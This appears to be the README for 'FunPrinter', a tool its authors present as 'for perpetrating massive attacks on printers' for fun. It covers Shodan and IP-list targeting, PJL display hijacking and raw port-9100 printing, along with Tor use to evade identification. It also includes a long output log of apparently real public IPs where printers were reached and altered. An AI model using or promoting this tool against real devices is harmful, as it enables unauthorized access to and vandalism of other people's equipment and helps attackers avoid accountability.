# FunPrinter
```    
    ________________
  _/_______________/|
 /___________/___//||   -- FunPrinter By FunSec --
|===        |----| ||
|           |   ô| ||
|___________|   ô| ||
| ||/.´---.||    | ||
|-||/_____\||-.  | |´
|_||=L==H==||_|__|/
```
### What is FunPrinter?
FunPrinter is a tool for perpetrating massive attacks on printers written by FunSec just for lulz.  
The tool has two modes: 
```
--mode shodan
--mode list 
```  
#### Shodan
The shodan mode searches for devices on the internet of things thanks to shodan api. To use this mode you will need yout own API key of shodan.
#### List
List mode reads a specific list and loads them into the program.  
Example list:  
```
140.223.12.34
80.211.32.12
90.23.442.12
5.123.422.12
```
### Message
```
--message <message_here>
```
This argument will specify the message that will be displayed on the printer's screen in case the printer uses PJL through port 9100.  
Example:
```
--message Hacked
```
##### Result (Old picture)
![Example](https://hacking-printers.net/wiki/images/thumb/1/16/PJL-display.png/800px-PJL-display.png)

#### TOR (Optional)
You can use tor to hide your identity (Recommended) so that no angry businessman tries to find you. To do this add --tor in the command of the script.
```python
socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
```
This line of code set the tor proxy in the script. Change the port if you need.

### How to use Usage
The first step is to have a file that you want to print on printers that have RAW protocol enabled.  
Example:
```
funsec@funsec # cat test.txt  
I hack you LMAO
```
If you use this file without going through A4.py it will not print correctly in the printer. The "test.txt" file needs to be a complete page.    

Then you need to execute this command:
```
kek@kek-PC # python A4.py test.txt
By FunSec with love ;)
```
After this simple step ... Happy hacking!.

Example:
```
kek@kek-PC # python funny.py --mode list --arg list.txt --message Succ! --tor myfile
    ________________
  _/_______________/|
 /___________/___//||   -- FunPrinter By FunSec --
|===        |----| ||
|           |   ô| ||
|___________|   ô| ||
| ||/.´---.||    | ||
|-||/_____\||-.  | |´
|_||=L==H==||_|__|/

[TOR] Verifying the connection to the proxy
[TOR] Actual IP: 77.247.181.162
[LIST] Reading list
[LIST] Done!. 199 ips loaded
[49.79.232.76] Connecting...
[49.79.232.76] Connection failed
[125.75.32.191] Connecting...
[125.75.32.191] Connection failed
[124.167.222.86] Connecting...
[124.167.222.86] Connection failed
[162.249.88.74] Connecting...
[162.249.88.74] Connected!
[162.249.88.74] Testing PJL
[162.249.88.74] Test completed!
[162.249.88.74] RICOH MP C4503
[162.249.88.74] Changing the display screen to Succ!
[162.249.88.74] Done!. Closing the connection
[213.248.30.125] Connecting...
[213.248.30.125] Connected!
[213.248.30.125] Testing PJL
[213.248.30.125] Protocol not supported. Closing the connection
[77.236.139.27] Connecting...
[77.236.139.27] Connected!
[77.236.139.27] Testing PJL
[77.236.139.27] Protocol not supported. Closing the connection
[95.173.193.20] Connecting...
[95.173.193.20] Connected!
[95.173.193.20] Testing PJL
[95.173.193.20] RAW protocol detected. Sending file
[95.173.193.20] Done!. Closing the connection
[218.75.141.13] Connecting...
[218.75.141.13] Connection failed
[173.247.166.122] Connecting...
[173.247.166.122] Connected!
[173.247.166.122] Testing PJL
[173.247.166.122] RAW protocol detected. Sending file
[173.247.166.122] Done!. Closing the connection
[112.171.47.235] Connecting...
[112.171.47.235] Connected!
[112.171.47.235] Testing PJL
[112.171.47.235] Protocol not supported. Closing the connection
[45.60.169.188] Connecting...
[45.60.169.188] Connected!
[45.60.169.188] Testing PJL
[45.60.169.188] Protocol not supported. Closing the connection
[107.154.163.139] Connecting...
[107.154.163.139] Connected!
[107.154.163.139] Testing PJL
[107.154.163.139] Protocol not supported. Closing the connection
[107.154.157.226] Connecting...
[107.154.157.226] Connected!
[107.154.157.226] Testing PJL
[107.154.157.226] Protocol not supported. Closing the connection
[107.154.206.184] Connecting...
[107.154.206.184] Connected!
[107.154.206.184] Testing PJL
[107.154.206.184] Protocol not supported. Closing the connection
[107.154.60.223] Connecting...
[107.154.60.223] Connected!
[107.154.60.223] Testing PJL
[107.154.60.223] Protocol not supported. Closing the connection
[203.130.62.58] Connecting...
[203.130.62.58] Connected!
[203.130.62.58] Testing PJL
[203.130.62.58] Protocol not supported. Closing the connection
[45.60.81.249] Connecting...
[45.60.81.249] Connected!
[45.60.81.249] Testing PJL
[45.60.81.249] Protocol not supported. Closing the connection
[177.0.87.163] Connecting...
[177.0.87.163] Connected!
[177.0.87.163] Testing PJL
[177.0.87.163] Test completed!
[177.0.87.163] Samsung M337x 387x 407x Series
[177.0.87.163] Changing the display screen to Succ!
[177.0.87.163] Done!. Closing the connection
[31.14.252.54] Connecting...
[31.14.252.54] Connected!
[31.14.252.54] Testing PJL
[31.14.252.54] RAW protocol detected. Sending file
[31.14.252.54] Done!. Closing the connection
[107.154.103.88] Connecting...
[107.154.103.88] Connected!
[107.154.103.88] Testing PJL
[107.154.103.88] Protocol not supported. Closing the connection
```
### Requeriments
```
python2.7 (Best version of python LMAO)
pip for python2.7
```
After having these two essential requirements, it is necessary to install the following modules with "pip install module" although this step can be done semiautomatically.  
#### Manual
Modules to install:
  ```
  PySocks, colorama, argparse, shodan
  ```
WARNING: Install all modules individually  
Example:  
Linux
```
pip install PySocks
```
Windows
```
C:\Python27\Scripts\pip.exe install PySocks
```
#### Semiautomatic
Run this command in yout shell m8  
Linux
```
pip install -r requeriments.txt
```
Windows
```
C:\Python27\Scripts\pip.exe install -r requeriments.txt
